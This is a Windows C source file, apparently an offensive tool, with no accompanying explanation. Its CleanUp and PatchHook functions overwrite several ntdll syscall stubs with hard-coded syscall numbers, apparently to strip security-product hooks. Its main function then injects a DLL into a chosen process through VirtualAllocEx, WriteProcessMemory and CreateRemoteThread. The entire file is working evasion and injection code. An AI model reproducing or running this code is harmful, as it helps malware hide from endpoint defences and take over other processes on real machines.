#include <Windows.h>
#include <stdio.h>

VOID PatchHook(CHAR* address, unsigned char id, char high);

VOID CleanUp() {
    HANDLE hDll = LoadLibrary("ntdll.dll");

    FARPROC ptrNtProtectVirtualMemory = GetProcAddress(hDll, "NtProtectVirtualMemory");
    FARPROC ptrNtAllocateVirtualMemoryEx = GetProcAddress(hDll, "NtAllocateVirtualMemoryEx");
    FARPROC ptrNtResumeThread = GetProcAddress(hDll, "NtResumeThread");
    FARPROC ptrNtWriteVirtualMemory = GetProcAddress(hDll, "NtWriteVirtualMemory");
    FARPROC ptrNtCreateThreadEx = GetProcAddress(hDll, "NtCreateThreadEx");

    PatchHook(ptrNtProtectVirtualMemory, 0x50, 0x00);
    PatchHook(ptrNtAllocateVirtualMemoryEx, 0x76, 0x00);
    PatchHook(ptrNtResumeThread, 0x52, 0x00);
    PatchHook(ptrNtWriteVirtualMemory, 0x3a, 0x00);
    PatchHook(ptrNtCreateThreadEx, 0xc1, 0x00);

    CloseHandle(hDll);
}

VOID PatchHook(CHAR* address, unsigned char id, char high) {
    DWORD dwSize = 11;
    CHAR* patch_address = address;
    //\x4c\x8b\xd1\xb8\xXX\xHH\x00\x00\x0f\x05\xc3
    CHAR* patch[dwSize];
    sprintf(patch, "\x4c\x8b\xd1\xb8%c%c%c%c\x0f\x05\xc3", id, high, high ^ high, high ^ high);

    DWORD dwOld;
    VirtualProtect(patch_address, dwSize, PAGE_EXECUTE_READWRITE, &dwOld);
    memcpy(patch_address, patch, dwSize);
}

int main(int argc, char **argv) {
    CleanUp();

    DWORD PID = atoi(argv[1]);
    CHAR *path = argv[2];
    DWORD dwWritten = 0;

    printf("Injecting %s into PID %d\n", path, PID);

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID);
    printf("Remote process HANDLE 0x%p. Error code %d\n", hProc, GetLastError());

    VOID* mem = VirtualAllocEx(hProc, NULL, strlen(path) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    printf("Remote memory allocated at 0x%p\n", mem);

    WriteProcessMemory(hProc, mem, path, strlen(path), &dwWritten);
    printf("%d (0x%08x) bytes written\n", dwWritten, dwWritten);

    FARPROC ptrLoadLibrary = GetProcAddress(LoadLibrary("kernel32.dll"), "LoadLibraryA");
    printf("LoadLibraryA at 0x%p\n", ptrLoadLibrary);

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, ptrLoadLibrary, mem, 0, NULL);
    printf("Remote thread HANDLE 0x%p\n", hThread);

    return 0;
}
